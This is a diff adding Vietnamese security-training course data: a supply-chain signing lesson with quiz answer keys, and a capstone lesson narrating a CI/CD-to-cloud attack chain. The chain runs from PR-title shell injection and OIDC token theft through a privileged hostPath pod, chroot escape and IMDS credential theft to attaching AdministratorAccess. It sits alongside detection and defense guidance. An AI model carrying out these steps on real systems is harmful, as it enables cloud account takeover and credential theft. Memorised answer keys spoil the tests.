+                "label": "Loại bỏ hoàn toàn GPG_PRIVATE_KEY khỏi Secrets; cấp quyền 'permissions: id-token: write' cho workflow; sử dụng lệnh 'cosign sign <image-digest>' để Cosign tự động lấy OIDC token từ GitHub Actions, yêu cầu chứng chỉ ngắn hạn từ CA Fulcio, ghi nhận chữ ký lên sổ cái Rekor Transparency Log và đẩy metadata lên OCI Registry.",
+                "correct": true,
+                "rationale": "Đây là quy trình Keyless Signing chuẩn xác của Sigstore: loại bỏ khóa tĩnh, sử dụng OIDC token gắn với workflow, tận dụng Fulcio CA ngắn hạn và Rekor để cung cấp bằng chứng minh bạch không thể chối bỏ."
+              },
+              {
+                "id": "B",
+                "label": "Đổi khóa GPG sang khóa SSH RSA 4096-bit và lưu vào AWS Secrets Manager.",
+                "correct": false,
+                "rationale": "Vẫn là mô hình khóa tĩnh dài hạn, không giải quyết được bài toán quản lý khóa, luân chuyển khóa và không có sổ cái minh bạch Rekor."
+              },
+              {
+                "id": "C",
+                "label": "Chỉ ký image digest bằng hàm SHA-256 nội bộ và lưu chuỗi hash vào tệp README.md của repository.",
+                "correct": false,
+                "rationale": "Lưu hash vào README không có giá trị mật mã học chứng thực danh tính người ký và không có cơ chế tự động xác thực tại Admission Controller."
+              },
+              {
+                "id": "D",
+                "label": "Cấu hình Docker daemon trên máy chủ tự động thêm nhãn 'trusted=true' vào metadata của container image khi push.",
+                "correct": false,
+                "rationale": "Metadata nhãn Docker không được bảo vệ bằng chữ ký số; bất kỳ ai có quyền truy cập registry đều có thể sửa đổi nhãn này một cách dễ dàng."
+              }
+            ]
+          },
+          {
+            "id": "case-89-03",
+            "title": "Xây Dựng Kyverno ClusterPolicy Cưỡng Chế Xác Thực Chữ Ký Số & In-toto SBOM Attestation",
+            "context": "Một cụm Kubernetes sản xuất đang tiếp nhận các bản cập nhật Pod từ nhiều nhóm phát triển. Cần thiết lập một chính sách Kyverno ClusterPolicy để ngăn chặn việc triển khai bất kỳ Pod nào mà image chưa được ký số bởi tổ chức, hoặc thiếu bảng kê khai nguyên vật liệu SBOM.",
+            "prompt": "Cấu hình Kyverno rule nào sau đây thực thi việc kiểm tra tính hợp lệ của cả chữ ký Sigstore Keyless và SBOM attestation trước khi cho phép Pod khởi chạy?",
+            "options": [
+              {
+                "id": "A",
+                "label": "Tạo một ValidatingWebhook trỏ tới một web service viết bằng Python kiểm tra xem tên image có chứa từ khóa 'prod' hay không.",
+                "correct": false,
+                "rationale": "Kiểm tra chuỗi tên image không mang lại bất kỳ sự đảm bảo nào về mật mã học hoặc tính toàn vẹn của mã nguồn."
+              },
+              {
+                "id": "B",
+                "label": "Xây dựng Kyverno ClusterPolicy với khối 'verifyImages': định nghĩa 'attestors' kiểm tra chứng chỉ Fulcio với issuer 'https://token.actions.githubusercontent.com' và subject cụ thể của tổ chức; tích hợp Rekor URL; đồng thời thêm điều kiện 'attestations' kiểm tra predicateType 'https://cyclonedx.org/schema' để bảo đảm SBOM hợp lệ luôn đính kèm.",
+                "correct": true,
+                "rationale": "Quy tắc Kyverno verifyImages với Sigstore keyless và in-toto attestation cho phép đối soát toàn bộ chuỗi tin cậy mật mã: xác minh OIDC issuer, Subject danh tính, SET timestamp từ Rekor và nội dung SBOM attestation."
+              },
+              {
+                "id": "C",
+                "label": "Sử dụng tính năng Kubernetes PodSecurityStandards ở cấp độ 'Baseline' trên tất cả các namespaces.",
+                "correct": false,
+                "rationale": "Pod Security Standards (PSS) chỉ kiểm soát các đặc quyền runtime của Pod (như capabilities, root user, hostPath), hoàn toàn không kiểm tra chữ ký số hay nguồn gốc chuỗi cung ứng của image."
+              },
+              {
+                "id": "D",
+                "label": "Cấu hình iptables trên các node worker chặn toàn bộ cổng 443 ra ngoài Internet.",
+                "correct": false,
+                "rationale": "Chặn cổng 443 sẽ phá vỡ khả năng giao tiếp của kubelet với các container registries và API services, gây tê liệt toàn bộ cụm máy chủ."
+              }
+            ]
+          }
+        ],
+        "successCriteria": [
+          "Phân biệt rõ ràng các mức độ bảo đảm của khung chuẩn OpenSSF SLSA v1.0 và mô hình đe dọa chuỗi cung ứng phần mềm.",
+          "Triển khai hoàn chỉnh quy trình ký số Sigstore Keyless Signing sử dụng Fulcio OIDC và Rekor Transparency Log.",
+          "Thiết lập thành công chính sách Kubernetes Admission Policy (Kyverno) kiểm tra cưỡng chế chữ ký số và SBOM attestation."
+        ],
+        "evidenceTemplate": [
+          "Tệp tài liệu SLSA Provenance v1.0 dạng JSON có chữ ký số của nền tảng build",
+          "Ảnh chụp màn hình hoặc log thực thi lệnh 'cosign verify' thể hiện Rekor bundle và chứng thư Fulcio X.509",
+          "Tệp kê khai SBOM định dạng CycloneDX JSON được đính kèm vào OCI image dưới dạng In-toto Attestation",
+          "Tệp manifest YAML chính sách Kyverno ClusterPolicy cưỡng chế xác minh hình ảnh container tại Admission Controller"
+        ],
+        "reset": "Xóa bỏ các chữ ký thử nghiệm trên OCI Registry, khôi phục Kyverno ClusterPolicy về chế độ Audit/Disabled trong môi trường lab.",
+        "cleanup": "Dọn dẹp các image tạm thời trên container registry, xóa bỏ các ephemeral keys và gỡ bỏ các webhook validation rules thử nghiệm."
+      },
+      "governance": {
+        "prevent": [
+          "Bắt buộc toàn bộ các sản phẩm container trước khi đẩy lên OCI Registry sản xuất phải được ký số thông qua quy trình Sigstore Keyless Signing và sinh SBOM chuẩn CycloneDX/SPDX.",
+          "Triển khai Kyverno hoặc Sigstore Policy Controller trên toàn bộ cụm Kubernetes ở chế độ 'Enforce', tự động chặn đứng mọi yêu cầu tạo Pod có image không hợp lệ hoặc thiếu chứng thực xuất xứ.",
+          "Áp dụng cơ chế khóa cứng phiên bản thư viện (Dependency Pinning với Checksum / Hash verification) trong các file định nghĩa package (package-lock.json, Pipfile.lock, go.sum) để ngăn chặn Dependency Confusion."
+        ],
+        "observe": [
+          "Giám sát Rekor Transparency Log đối với các chứng chỉ mới được phát hành mang định danh tổ chức để phát hiện kịp thời các chữ ký bất thường.",
+          "Thu thập và cảnh báo qua SIEM đối với các sự kiện Kubernetes Admission Webhook Rejection (khi có Pod bị chặn do không đạt tiêu chuẩn ký số).",
+          "Quét định kỳ toàn bộ kho lưu trữ OCI Registry để phát hiện các image đã triển khai nhưng phát sinh lỗ hổng mới theo cơ sở dữ liệu CVE cập nhật."
+        ],
+        "respond": [
+          "Khi phát hiện một container image bị can thiệp trái phép hoặc lộ khóa, lập tức cập nhật chính sách Admission Controller để đưa digest của image đó vào Blacklist/Deny-list.",
+          "Thực hiện cô lập các Pod đang chạy image bị tổn thương, kích hoạt quy trình điều tra số pháp y dựa trên nhật ký Provenance và SBOM.",
+          "Tái biên dịch ứng dụng từ commit sạch đã được kiểm toán trên môi trường SLSA Build L3 cô lập và ký số lại toàn bộ tạo phẩm mới."
+        ],
+        "residualRisk": [
+          "Lỗ hổng logic bảo mật nằm ngay trong chính mã nguồn gốc của ứng dụng (do lập trình viên vô tình tạo ra) vẫn vượt qua được các chốt kiểm tra chữ ký số và SBOM.",
+          "Nguy cơ xâm nhập thông qua các phụ thuộc gián tiếp rất sâu trong cây thư viện mã nguồn mở mà cơ sở dữ liệu CVE toàn cầu chưa kịp cập nhật (Zero-day Supply Chain Vulnerabilities)."
+        ]
+      },
+      "misconceptions": [
+        {
+          "claim": "Một container image đã vượt qua công cụ quét lỗ hổng (như Trivy/Clair) với kết quả 0 CVE đồng nghĩa với việc nó an toàn 100% trước các cuộc tấn công chuỗi cung ứng.",
+          "correction": "Hoàn toàn sai lầm. Quét CVE chỉ phát hiện các lỗi bảo mật đã được công bố công khai trong cơ sở dữ liệu. Nếu kẻ tấn công chèn cửa sau độc hại mới (như trường hợp SolarWinds hay XZ Utils) hoặc thay thế file nhị phân trong quá trình build, công cụ quét CVE sẽ hoàn toàn mù tịt. Đó là lý do bắt buộc phải có xác thực Provenance và SLSA."
+        },
+        {
+          "claim": "Ký số không khóa (Keyless Signing) trong Sigstore có nghĩa là dữ liệu không được bảo vệ bằng mật mã học bất đối xứng.",
+          "correction": "Không chính xác. Keyless Signing vẫn sử dụng cặp khóa bất đối xứng tiêu chuẩn (ECDSA/RSA) để ký số. Từ 'Keyless' ám chỉ việc người dùng không phải tự lưu trữ và quản lý các khóa bí mật dài hạn rủi ro; khóa riêng được sinh tạm thời trong RAM và tiêu hủy ngay sau khi ký, trong khi tính hợp lệ được chứng thực qua OIDC Identity và Rekor Transparency Log."
+        },
+        {
+          "claim": "Việc tạo Software Bill of Materials (SBOM) một lần khi build ứng dụng là đủ để đảm bảo an toàn vĩnh viễn cho chuỗi cung ứng của container image đó.",
+          "correction": "SBOM chỉ là một bản chụp (snapshot) tĩnh của các thành phần phần mềm tại thời điểm biên dịch. Các lỗ hổng bảo mật mới (Zero-day / N-day CVEs) trong các thư viện phụ thuộc liên tục được phát hiện mỗi ngày. Nếu không có cơ chế liên tục đối soát lại SBOM theo thời gian thực (Continuous SBOM Runtime Auditing) kết hợp với cơ sở dữ liệu lỗ hổng mới nhất, một container image an toàn hôm nay có thể trở thành mục tiêu khai thác nguy hiểm vào ngày mai."
+        }
+      ],
+      "quiz": [
+        {
+          "id": "os09-l89-q1",
+          "difficulty": "easy",
+          "question": "Mục tiêu cốt lõi của việc áp dụng mô hình Ký Số Không Khóa (Keyless Signing) trong Sigstore là gì?",
+          "options": [
+            {
+              "id": "A",
+              "label": "Giảm kích thước của file container image để tải nhanh hơn."
+            },
+            {
+              "id": "B",
+              "label": "Loại bỏ hoàn toàn rủi ro quản lý và lộ lọt các private keys dài hạn bằng cách sử dụng chứng thư tạm thời ngắn hạn gắn với định danh OIDC và lưu vết minh bạch trên Rekor."
+            },
+            {
+              "id": "C",
+              "label": "Bỏ qua việc kiểm tra danh tính của người ký để tăng tốc độ pipeline."
+            },
+            {
+              "id": "D",
+              "label": "Cho phép bất kỳ ai cũng có thể sửa đổi container image sau khi đã ký."
+            }
+          ],
+          "correctAnswer": "B",
+          "explanation": "Sigstore Keyless Signing giải quyết bài toán nhức nhối nhất của mật mã học truyền thống: quản lý khóa dài hạn. Bằng cách dùng khóa tạm thời (ephemeral keys), chứng thư X.509 ngắn hạn từ Fulcio dựa trên OIDC và sổ cái minh bạch Rekor, hệ thống đạt được độ an toàn tối đa mà không lo bị lộ private keys."
+        },
+        {
+          "id": "os09-l89-q2",
+          "difficulty": "medium",
+          "question": "Theo khung chuẩn OpenSSF SLSA v1.0, điều kiện kỹ thuật then chốt nào phân biệt giữa cấp độ Build Level 2 và Build Level 3?",
+          "options": [
+            {
+              "id": "A",
+              "label": "Build L2 yêu cầu ngôn ngữ lập trình Rust, còn Build L3 yêu cầu C++."
+            },
+            {
+              "id": "B",
+              "label": "Build L3 yêu cầu môi trường build phải Hermetic (cô lập hoàn toàn, không phụ thuộc ngoại cảnh), Ephemeral (tạm thời, tiêu hủy sau khi build), và các tham số build không thể bị can thiệp bởi mã nguồn dự án."
+            },
+            {
+              "id": "C",
+              "label": "Build L2 chạy trên máy tính cá nhân, còn Build L3 chỉ chạy trên máy chủ mainframe."
+            },
+            {
+              "id": "D",
+              "label": "Build L3 chỉ đơn giản là bổ sung thêm bước quét mã tĩnh SAST."
+            }
+          ],
+          "correctAnswer": "B",
+          "explanation": "SLSA Build Level 3 đòi hỏi mức độ bảo đảm cao nhất cho nền tảng build: môi trường build phải hoàn toàn độc lập, tạm thời (ephemeral), cách ly (hermetic) và ngăn chặn mọi nguy cơ can thiệp chéo hoặc giả mạo dữ liệu provenance từ phía mã nguồn hoặc lập trình viên."
+        },
+        {
+          "id": "os09-l89-q3",
+          "difficulty": "hard",
+          "question": "Khi một Kubernetes Admission Controller (như Kyverno) xác thực một container image được ký bằng Sigstore Keyless, cơ chế nào bảo đảm tính hợp lệ của chữ ký khi mà khóa riêng tạm thời đã bị tiêu hủy ngay sau khi build?",
+          "options": [
+            {
+              "id": "A",
+              "label": "Admission Controller tự động giải mã toàn bộ image bằng thuật toán AES."
+            },
+            {
+              "id": "B",
+              "label": "Admission Controller dựa vào Bằng chứng Tồn tại (Inclusion Proof) và Dấu thời gian (SET) trên Rekor Transparency Log để chứng minh rằng chữ ký đã được tạo ra khi chứng chỉ Fulcio vẫn còn hiệu lực và đúng với định danh OIDC được phê duyệt."
+            },
+            {
+              "id": "C",
+              "label": "Admission Controller gửi email cho lập trình viên để yêu cầu xác nhận mỗi khi có Pod khởi động."
+            },
+            {
+              "id": "D",
+              "label": "Admission Controller khôi phục lại private key từ bộ nhớ swap của máy chủ CI/CD."
+            }
+          ],
+          "correctAnswer": "B",
+          "explanation": "Sổ cái Rekor cung cấp Signed Entry Timestamp (SET) không thể giả mạo. Admission Controller đối soát chứng thư Fulcio X.509 với bản ghi trên Rekor để chứng minh toán học rằng chữ ký được tạo ra trong cửa sổ thời gian 10 phút khi chứng chỉ còn hiệu lực, xác thực danh tính OIDC mà không cần lưu giữ private key."
+        }
+      ],
+      "transferChallenge": {
+        "scenario": "Tập đoàn công nghệ tài chính của bạn đang triển khai một kiến trúc microservices với hơn 150 dịch vụ containerized trên cụm Amazon EKS. Một cuộc rà soát gần đây chỉ ra rằng các lập trình viên đang kéo hàng trăm base images không rõ nguồn gốc từ Docker Hub công cộng và không có bất kỳ cơ chế kiểm soát chữ ký nào tại cửa ngõ cluster. Bạn được giao nhiệm vụ thiết lập một chương trình Quản Trị Chuỗi Cung Ứng Vùng Chứa Toàn Diện theo chuẩn SLSA và Sigstore.",
+        "tasks": [
+          "Xây dựng đường ống đóng gói container chuẩn hóa trong GitHub Actions sử dụng Sigstore/Cosign để ký số tự động theo mô hình Keyless và sinh tài liệu SLSA Provenance v1.0.",
+          "Tích hợp công cụ Syft để tự động sinh SBOM định dạng CycloneDX JSON, đính kèm thành In-toto Attestation và ký số bằng Cosign đẩy lên kho lưu trữ AWS ECR.",
+          "Soạn thảo và triển khai chính sách Kyverno ClusterPolicy trên cụm Amazon EKS nhằm chặn đứng 100% các Pod không có chữ ký số từ GitHub OIDC của tập đoàn hoặc thiếu attestation SBOM hợp lệ."
+        ],
+        "requiredEvidence": [
+          "Đoạn mã workflow GitHub Actions (.github/workflows/build-and-sign.yml) cấu hình đầy đủ quyền OIDC và các bước ký Cosign Keyless",
+          "Tệp trích xuất kết quả xác minh 'cosign verify-attestation --type cyclonedx' thể hiện chứng thư Fulcio và Rekor log entry",
+          "Tập tin cấu hình Kyverno ClusterPolicy (YAML) cưỡng chế xác minh hình ảnh container kèm log ghi nhận sự kiện chặn một container chưa ký thử nghiệm"
+        ]
+      },
+      "sources": [
+        {
+          "title": "OpenSSF SLSA — Supply-chain Levels for Software Artifacts Specification v1.0",
+          "url": "https://slsa.dev/spec/v1.0/",
+          "publisher": "Open Source Security Foundation (OpenSSF)",
+          "sourceType": "official-standard",
+          "accessedAt": "2026-09-04",
+          "supports": [
+            "Đặc tả kỹ thuật SLSA Build Track Levels 1, 2, 3",
+            "Mô hình đe dọa chuỗi cung ứng phần mềm và cấu trúc Provenance"
+          ]
+        },
+        {
+          "title": "Sigstore Documentation — Keyless Signatures with Fulcio and Rekor",
+          "url": "https://docs.sigstore.dev/",
+          "publisher": "Linux Foundation / Sigstore Project",
+          "sourceType": "official-guidance",
+          "accessedAt": "2026-09-04",
+          "supports": [
+            "Kiến trúc Fulcio Short-lived CA và Rekor Transparency Log",
+            "Quy trình xác thực và ký số Cosign OCI Artifacts"
+          ]
+        },
+        {
+          "title": "NIST SP 800-161r1 — Cybersecurity Supply Chain Risk Management Practices for Systems and Organizations",
+          "url": "https://csrc.nist.gov/publications/detail/sp/800-161/rev-1/final",
+          "publisher": "National Institute of Standards and Technology (NIST)",
+          "sourceType": "official-standard",
+          "accessedAt": "2026-09-04",
+          "supports": [
+            "Khung quản lý rủi ro chuỗi cung ứng phần mềm liên bang",
+            "Yêu cầu về tính toàn vẹn của mã nguồn và xác thực nhà cung cấp"
+          ]
+        },
+        {
+          "title": "CNCF Software Supply Chain Best Practices White Paper",
+          "url": "https://www.cncf.io/reports/software-supply-chain-best-practices/",
+          "publisher": "Cloud Native Computing Foundation (CNCF)",
+          "sourceType": "official-guidance",
+          "accessedAt": "2026-09-04",
+          "supports": [
+            "Thực hành sinh và quản lý Software Bill of Materials (SBOM)",
+            "Kiểm soát cưỡng chế tại Kubernetes Admission Controllers"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "os09-l90-cloud-container-sandbox-capstone",
+      "slug": "cloud-container-sandbox-capstone",
+      "title": "Bài Tập Capstone Đám Mây & Vùng Chứa: Chuỗi Tấn Công Phức Hợp End-to-End Từ Source Code Đến Cloud Control Plane",
+      "summary": "Thực hiện bài tập Capstone tổng hợp toàn bộ kỹ năng của Track 09: mô phỏng chuỗi tấn công phức hợp Red Team / Purple Team từ việc khai thác workflow CI/CD bị hổng, đánh cắp OIDC temporary credentials, thâm nhập cụm Kubernetes qua Workload Identity, thực hiện Container Breakout leo thang lên Host Node và tiến công chiếm đoạt toàn bộ Cloud Control Plane; song song với việc thiết lập ma trận giám sát Telemetry (CloudTrail, VPC Flow, Falco/Tetragon, Auditd) và ban hành các giải pháp Hardening phòng thủ chuyên sâu.",
+      "difficulty": "expert",
+      "durationMinutes": 180,
+      "prerequisites": [
+        "os09-l88-cicd-pipeline-security-and-runner-compromise",
+        "os09-l89-software-supply-chain-and-artifact-integrity"
+      ],
+      "outcomes": [
+        "Phân tích và thực thi chuỗi tấn công phức hợp liên hoàn (End-to-End Kill Chain) từ lỗ hổng CI/CD workflow, trích xuất OIDC credentials đến đột nhập cụm Kubernetes.",
+        "Bóc tách cơ chế chuyển dịch đặc quyền ngang (Lateral Movement) từ Pod được cấp quyền dư thừa sang Container Breakout kiểm soát Worker Node và truy vấn IMDS metadata.",
+        "Khai thác các cấu hình sai lệch Cloud IAM (Policy Misconfigurations) của Node Instance Role để leo thang đặc quyền toàn năng trên Cloud Control Plane (Full Cloud Takeover).",
+        "Xây dựng chiến lược phòng ngự có chiều sâu (Defense-in-Depth), tương quan hóa telemetry đa tầng (eBPF Falco, Kube-Audit, AWS CloudTrail) và thiết lập rào chắn Zero-Tolerance bẻ gãy Kill Chain."
+      ],
+      "careerPaths": ["penetration-test", "red-team", "purple-team"],
+      "domains": ["cloud", "container", "cicd", "supply-chain"],
+      "attackTactics": [
+        "initial-access",
+        "execution",
+        "persistence",
+        "privilege-escalation",
+        "defense-evasion",
+        "credential-access",
+        "discovery",
+        "lateral-movement",
+        "impact"
+      ],
+      "keywords": [
+        "capstone-attack-chain",
+        "end-to-end-killchain",
+        "cicd-to-cloud",
+        "container-breakout",
+        "workload-identity-compromise",
+        "imds-exfiltration",
+        "cloud-control-plane-takeover",
+        "detection-engineering",
+        "falco-ebpf",
+        "cloudtrail-telemetry"
+      ],
+      "safetyLevel": "isolated-only",
+      "mentalModel": "Trong kỷ nguyên đám mây và điện toán đám mây gốc (Cloud Native), không có cuộc tấn công nào diễn ra cô lập trong một ranh giới đơn lẻ. Một cuộc xâm nhập thực tế là một chuỗi mắt xích liên hoàn (Kill Chain) kết nối các bề mặt tấn công khác nhau: từ mã nguồn ứng dụng, đường ống CI/CD, chuỗi cung ứng container, hạ tầng runtime Kubernetes cho đến mặt phẳng điều khiển Cloud IAM. Điểm yếu ở một tầng (như việc cấu hình lỏng lẻo điều kiện OIDC claim trên GitHub Actions) sẽ trở thành đòn bẩy để kẻ tấn công đột nhập vào cluster; từ cluster, một quyền cấp quá mức (như mount Docker socket hay cấp cờ privileged) sẽ dẫn đến việc kiểm soát node; và từ node, việc trích xuất IMDS metadata hoặc Node IAM Role sẽ dẫn đến thảm họa mất toàn bộ Cloud Control Plane. Năng lực phòng thủ thực thụ không nằm ở việc chặn từng điểm đơn lẻ, mà là xây dựng một kiến trúc phòng ngự có chiều sâu (Defense-in-Depth) với khả năng giám sát tương quan đa tầng (Multi-layer Correlated Telemetry) và thiết lập ranh giới cách ly không khoan nhượng tại mọi điểm giao tiếp.",
+      "visual": {
+        "title": "Sơ Đồ Chuỗi Tấn Công Capstone Toàn Diện Từ Mã Nguồn Đến Cloud Dominance",
+        "caption": "Diễn tiến 4 giai đoạn thâm nhập có chiều sâu từ CI/CD injection, Workload Identity, Container Breakout đến Cloud Control Plane.",
+        "steps": [
+          {
+            "label": "Đột Nhập CI/CD & Đánh Cắp OIDC Token",
+            "detail": "Khai thác lỗ hổng context injection trong workflow pull_request_target, trích xuất GitHub Actions OIDC JWT và tráo đổi lấy AWS Temporary Credentials của Role CI-Deployer.",
+            "tone": "caution"
+          },
+          {
+            "label": "Thâm Nhập Kubernetes & Leo Thang Quyền Node",
+            "detail": "Sử dụng quyền deploy để tạo Pod chứa cấu hình độc hại (hostPID: true, mount /var/run/docker.sock hoặc cgroup release_agent) thâm nhập sâu vào cụm Kubernetes.",
+            "tone": "caution"
+          },
+          {
+            "label": "Thoát Vùng Chứa & Trích Xuất IMDS Node Metadata",
+            "detail": "Thực hiện Container Breakout ra host node Linux, truy vấn dịch vụ AWS IMDS để trích xuất Access Keys của IAM Role máy chủ EKS Node (NodeInstanceRole).",
+            "tone": "stop"
+          },
+          {
+            "label": "Chiếm Đoạt Hoàn Toàn Cloud Control Plane",
+            "detail": "Lạm dụng quyền iam:AttachRolePolicy hoặc ec2:RunInstances từ Node Role để leo thang đặc quyền lên AdministratorAccess, chiếm quyền kiểm soát toàn bộ tài khoản AWS của doanh nghiệp.",
+            "tone": "stop"
+          }
+        ]
+      },
+      "sections": [
+        {
+          "title": "Giải Phẫu Chuỗi Tấn Công Phức Hợp (End-to-End Attack Chain): Từ CI/CD Injection Đến Cloud Dominance",
+          "paragraphs": [
+            "Bài tập Capstone này mô phỏng một chiến dịch tấn công quy mô lớn của nhóm gián điệp mạng có chủ đích (APT) hoặc đội ngũ Red Team chuyên nghiệp nhắm vào một tập đoàn tài chính đa quốc gia vận hành toàn bộ hạ tầng trên đám mây AWS kết hợp Amazon EKS và GitHub Enterprise. Cuộc tấn công không lợi dụng một lỗ hổng zero-day đơn lẻ trên ứng dụng mà xâu chuỗi một loạt các sai sót cấu hình (Misconfigurations) và phân quyền dư thừa trên nhiều tầng kiến trúc khác nhau để tạo thành một chuỗi hủy diệt hoàn hảo.",
+            "Giai Đoạn 1: Thâm Nhập Ban Đầu (Initial Access & CI/CD Compromise). Kẻ tấn công phát hiện một kho chứa mã nguồn mở phục vụ SDK của ngân hàng có workflow 'ci-cd.yml' kích hoạt bởi sự kiện 'pull_request_target'. Workflow này sử dụng biểu thức nội suy '${{ github.event.pull_request.title }}' trực tiếp trong một câu lệnh shell kiểm tra định dạng commit. Kẻ tấn công tạo fork và mở một PR với tiêu đề chứa chuỗi lệnh bash độc hại. Khi workflow chạy, script độc hại được kích hoạt trong ngữ cảnh của base repository. Script này nhanh chóng đọc biến môi trường '$ACTIONS_ID_TOKEN_REQUEST_TOKEN' và gọi tới endpoint OIDC cục bộ để lấy một JWT hợp lệ. Kẻ tấn công gửi JWT này tới AWS STS API với lệnh 'AssumeRoleWithWebIdentity'. Do Trust Policy trên IAM Role 'GitHub-CI-Deployer' sử dụng điều kiện lỏng lẻo '\"StringLike\": { \"token.actions.githubusercontent.com:sub\": \"repo:bank-corp/*:*\" }', AWS STS chấp thuận yêu cầu và cấp phát một bộ thông tin xác thực tạm thời (AccessKeyId, SecretAccessKey, SessionToken) cho kẻ tấn công.",
+            "Giai Đoạn 2: Chuyển Dịch Quyền Lực Vào Cụm Kubernetes (Pivoting into Kubernetes). Với thông tin xác thực của Role 'GitHub-CI-Deployer', kẻ tấn công sử dụng công cụ AWS CLI để kết nối vào cụm Amazon EKS ('aws eks update-kubeconfig --name prod-cluster'). Trên cụm EKS, Role này đã được quản trị viên ánh xạ trong aws-auth ConfigMap hoặc EKS Access Entries với quyền tương đương ClusterRole 'edit' trong namespace 'workloads'. Kẻ tấn công không thể đọc secrets của namespace kube-system trực tiếp, nhưng với quyền tạo Pod trong namespace 'workloads' và do cụm chưa kích hoạt Pod Security Standards (PSS) ở chế độ Enforce, kẻ tấn công tạo một Pod chứa cấu hình nguy hiểm: 'hostPID: true', 'hostNetwork: true', và mount trực tiếp thư mục gốc của node vật lý: 'volumes: [ { name: host, hostPath: { path: / } } ]'.",
+            "Giai Đoạn 3 & 4: Thoát Vùng Chứa Lên Host Node Và Thao Túng Cloud Control Plane (Host Breakout to Cloud Takeover). Khi Pod khởi chạy trên một Worker Node (EC2 instance), kẻ tấn công thực thi lệnh 'kubectl exec' vào Pod và sử dụng 'chroot /host' để chiếm quyền root tuyệt đối trên hệ điều hành máy chủ vật lý của node. Từ hệ điều hành máy chủ, kẻ tấn công truy vấn dịch vụ Instance Metadata Service (IMDS) tại địa chỉ 'http://169.254.169.254/latest/meta-data/iam/security-credentials/'. Do máy chủ EC2 vẫn cho phép giao thức IMDSv1 và không cấu hình Hop Limit, kẻ tấn công lấy được thông tin xác thực IAM của 'EKS-Worker-Node-Instance-Role'. Tiếp tục kiểm tra quyền hạn của Role này qua IAM enumeration, kẻ tấn công phát hiện vai trò này bị cấu hình dư thừa quyền 'iam:AttachRolePolicy' hoặc 'iam:PutRolePolicy' (vốn được thêm tạm thời trong một đợt bảo trì hệ thống nhưng quên gỡ bỏ). Kẻ tấn công lập tức gắn chính sách 'AdministratorAccess' (arn:aws:iam::aws:policy/AdministratorAccess) vào vai trò của chính mình, chính thức chiếm đoạt toàn bộ quyền quản trị tối cao trên toàn bộ tài khoản AWS của doanh nghiệp."
+          ]
+        },
+        {
+          "title": "Tương Quan Dấu Vết Telemetry Đa Tầng (Multi-Layer Telemetry Correlation): Xâu Chuỗi Sự Kiện Giám Sát Từ Host Đến Đám Mây",
+          "paragraphs": [
+            "Thách thức lớn nhất trong việc điều tra và ngăn chặn các cuộc tấn công Cloud-Native đa tầng là các dấu vết sự kiện thường bị phân mảnh và nằm rải rác trên nhiều kho lưu trữ nhật ký độc lập. Một trung tâm điều hành an ninh mạng (SOC) truyền thống chỉ giám sát nhật ký máy chủ hoặc chỉ theo dõi nhật ký mạng sẽ hoàn toàn bỏ lỡ bức tranh tổng thể. Để phát hiện chuỗi tấn công liên hoàn, kỹ sư an ninh phòng thủ (Purple Team / Detection Engineer) bắt buộc phải thiết lập mô hình Giám Sát Tương Quan Đa Tầng (Correlated Telemetry Pipeline).",
+            "Tầng Thứ Nhất - GitHub Audit Logs: Ghi nhận sự kiện kích hoạt workflow từ một IP lạ bên ngoài, sự kiện Pull Request mang tiêu đề chứa ký tự shell bất thường, và đặc biệt là sự kiện 'id_token' được phát hành cho một commit SHA không thuộc nhánh chính của repository. Đây là chỉ dấu xâm nhập ban đầu (Initial IOC) nhưng thường bị bỏ qua nếu không có cảnh báo tự động kết nối về SIEM.",
+            "Tầng Thứ Hai - AWS CloudTrail Telemetry: Ngay sau khi token OIDC được sinh ra, CloudTrail ghi nhận sự kiện API 'AssumeRoleWithWebIdentity' từ dịch vụ 'sts.amazonaws.com'. Phân tích sâu trường 'requestParameters' trong CloudTrail Event cho thấy Subject Claim trong JWT phản ánh nhánh PR của fork bên ngoài ('repo:bank-corp/sdk:pull_request'). Chỉ ít phút sau, CloudTrail tiếp tục ghi nhận sự kiện 'DescribeCluster' trên EKS từ cùng danh tính tạm thời đó. Đây là dấu hiệu rõ ràng của hành vi chuyển tiếp đặc quyền từ đường ống CI/CD sang cụm Kubernetes.",
+            "Tầng Thứ Ba - Kubernetes API Server Audit Logs & eBPF Telemetry (Falco/Tetragon): Tại tầng cụm, Kube-apiserver Audit Logs ghi lại một yêu cầu 'create' đối tượng Pod có chứa trường 'securityContext.privileged: true' hoặc 'spec.hostPID: true' từ tài khoản dịch vụ CI-Deployer. Đồng thời trên máy chủ node worker, cảm biến eBPF của Falco kích hoạt hàng loạt cảnh báo thời gian thực ở mức độ Critical: 'Notice: Privileged container started', 'Warning: Chroot operation detected on host filesystem', và 'Alert: Outbound connection to IMDS IP (169.254.169.254) from unexpected process (curl/python)'. Cuối cùng, CloudTrail ghi nhận sự kiện 'AttachRolePolicy' với chính sách 'AdministratorAccess' xuất phát từ địa chỉ IP riêng của chính Worker Node đó. Việc xâu chuỗi 4 tầng telemetry này dựa trên dòng thời gian và các định danh chia sẻ (AssumedRole ARN, SessionName, Client IP, Pod UID) cho phép đội ngũ ứng cứu sự cố tái hiện chính xác 100% từng bước đi của kẻ tấn công trong vòng vài phút thay vì nhiều tuần."
+          ]
+        },
+        {
+          "title": "Chiến Lược Phòng Thủ Toàn Diện (Defense-in-Depth Architecture): Triệt Tiêu Chuỗi Tấn Công Tại Từng Mắt Xích",
+          "paragraphs": [
+            "Nguyên tắc vàng của kiến trúc phòng thủ theo chiều sâu (Defense-in-Depth) trong môi trường đám mây là: Không bao giờ tin tưởng vào một rào chắn duy nhất. Một hệ thống an toàn không phải là hệ thống không thể bị tấn công ở tầng ngoài cùng, mà là hệ thống có khả năng 'Bẻ Gãy Chuỗi Tấn Công' (Kill Chain Disruption) ngay tại bất kỳ mắt xích trung gian nào, ngăn không cho tổn thất lan rộng sang các tầng kiến trúc cốt lõi.",
